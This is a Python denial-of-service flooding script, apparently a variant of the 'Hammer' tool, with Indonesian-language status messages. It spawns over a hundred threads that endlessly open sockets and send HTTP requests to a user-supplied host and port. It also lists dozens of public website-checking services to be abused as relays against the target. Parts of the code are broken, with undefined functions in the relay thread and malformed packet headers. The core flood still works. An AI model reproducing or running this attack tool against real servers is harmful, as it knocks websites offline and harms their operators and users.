
from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("dfwdiesel.net/check?u=")
	bots.append("http://api.hackertarget.com/geoip/?q=")
	bots.append("https://downforeveryoneorjustme.com/")
	bots.append("https://website-down.com/")
	bots.append("http://www.wholinks2me.com/details.php?url=$TARGET")
	bots.append("https://developer.microsoft.com/en-us/microsoft-edge/tools/staticscan/?url=$TARGET")
	bots.append("http://www.alexa.com/siteinfo/$TARGET")
	bots.append("http://nibbler.silktide.com/en_US/reports/$TARGET")
	bots.append("https://www.openadmintools.com/en/$TARGET")
	bots.append("http://www.rankflex.com/en/check/$TARGET")
	bots.append("http://www.statscrop.com/www/$TARGET")
	bots.append("http://guess.scritch.org/%2Bguess/?url=$TARGET")
	bots.append("https://research.domaintools.com/research/screenshot-history/$TARGET")
	bots.append("http://pressaboutus.com/$TARGET")
	bots.append("http://builtwith.com/$TARGET")
	bots.append("http://www.scamadviser.com/check-website/$TARGET")
	bots.append("https://whois.domaintools.com/$TARGET")
	bots.append("http://wave.webaim.org/report?url=$TARGET")
	bots.append("https://www.google.com/webmasters/tools/mobile-friendly/?url=$TARGET")
	bots.append("http://www.sidar.org/hera/index.php.en?url=$TARGET")
	bots.append("https://www.whatsmydns.net/#A/$TARGET")
	bots.append("http://www.rexswain.com/cgi-bin/httpview.cgi?url=$TARGET")
	bots.append("http://sitecheck.sucuri.net/results/$TARGET")
	bots.append("http://spdycheck.org/#$TARGET")
	bots.append("https://www.sslshopper.com/ssl-checker.html#hostname=$TARGET")
	bots.append("http://www.greatfirewallofchina.org/index.php?siteurl=$TARGET")
	bots.append("http://www.currentlydown.com/$TARGET")
	bots.append("http://www.websiteoptimization.com/services/analyze/wso.php?url=$TARGET")
	bots.append("http://developers.google.com/speed/pagespeed/insights/?url=$TARGET")
	bots.append("http://www.opensiteexplorer.org/links?site=$TARGET")
	bots.append("https://majestic.com/reports/site-explorer?q=$TARGET")
	bots.append("http://realfavicongenerator.net/favicon_checker?site=$TARGET")
	bots.append("https://gsnedders.html5.org/outliner/process.py?url=$TARGET")
	bots.append("https://developers.facebook.com/tools/debug/og/object?q=$TARGET")
	bots.append("http://www.texttrust.com/public/free-trial.aspx?affiliate_id=12115586&checkurl=$TARGET")
	bots.append("http://www.siteprice.org/website-worth/$TARGET")
	bots.append("http://www.siteworthtraffic.com/report/$TARGET")
	bots.append("http://www.textise.net/showText.aspx?strURL=$TARGET")
	bots.append("http://services.w3.org/xslt?xmlfile=http%3A%2F%2Fservices.w3.org%2Ftidy%2Ftidy%3FdocAddr%3D$TARGET&xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl")
	bots.append("http://validator.w3.org/mobile/check?docAddr=$TARGET&async=false")
	bots.append("http://www.htmlhelp.com/cgi-bin/validate.cgi?url=$TARGET&warnings=yes&spider=yes")
	bots.append("http://www.seo-browser.com/index.php?address=$TARGET&action=Parse+URL")
	bots.append("https://tools.pingdom.com/fpt/?url=$TARGET&treeview=0&column=objectID&order=1&type=0&save=true")
	bots.append("https://tools.pingdom.com/ping/?target=$TARGET&o=2&save=false")
	bots.append("http://mxtoolbox.com/SuperTool.aspx?action=blacklist%3a$TARGET&run=toolpage")
	bots.append("http://valet.webthing.com/access/htnorm?url=http%3A%2F%2F$TARGET&suite=WCAG3&xslt=listed")
	bots.append("http://valet.webthing.com/access/htnorm?url=http%3A%2F%2F$TARGET&suite=SECTION508&xslt=listed")
	bots.append("http://accesslint.com/results?url=http%3A%2F%2F$TARGET&commit=Analyze")
	bots.append("http://colorfilter.wickline.org/?a=1;r=uitest.com;l=0;j=1;u=http%3A%2F%2F$TARGET;t=p")
	bots.append("http://quirktools.com/screenfly/#u=$TARGET&w=1024&h=600")
	bots.append("https://trustscam.com/en/$TARGET?analyzeNow=1")
	bots.append("http://www.sitestatus.net/value=$TARGET&Submit=Check&_cmd=CheckURL")
	return(bots)


def bot_nuke(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94mLoading...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[94m ATTACK--> \033[0 \033[92m",host,random.choice(bots),"<-- BOTS\033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mno sambungan! server telah  down\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_exstraxing(all.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print ('''doen''')
	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
	print("\033[94mMohon tunggu sebentar...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91IP YG ANDA MASUKAN TIDAK TERSEDIA MOHON PERIKSA KEMBALI\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
